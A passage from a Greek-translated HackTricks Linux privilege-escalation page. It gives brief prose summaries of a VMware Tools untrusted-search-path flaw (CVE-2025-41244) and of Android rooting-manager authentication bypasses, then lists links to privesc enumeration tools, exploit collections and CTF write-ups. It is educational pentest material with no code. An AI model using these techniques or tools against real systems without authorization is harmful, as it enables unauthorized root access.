### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Αδύναμη manager authentication (π.χ., signature checks βασισμένοι σε FD-order ή ανεπαρκή password schemes) μπορεί να επιτρέψει σε μια τοπική εφαρμογή να προσποιηθεί τον manager και να αποκτήσει root σε συσκευές που είναι ήδη rooted. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Η ανακάλυψη υπηρεσιών με βάση regex στο VMware Tools/Aria Operations μπορεί να εξάγει μια διαδρομή binary από τις γραμμές εντολών διεργασιών και να το εκτελέσει με -v υπό προνομιακό context. Επιτρεπτικά patterns (π.χ., χρήση \S) μπορεί να ταιριάξουν με listener που τοποθετήθηκαν από τον επιτιθέμενο σε εγγράψιμες τοποθεσίες (π.χ., /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern που εφαρμόζεται και σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες Ασφάλειας Πυρήνα

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Καλύτερο εργαλείο για να αναζητήσετε Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Αναφορές

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
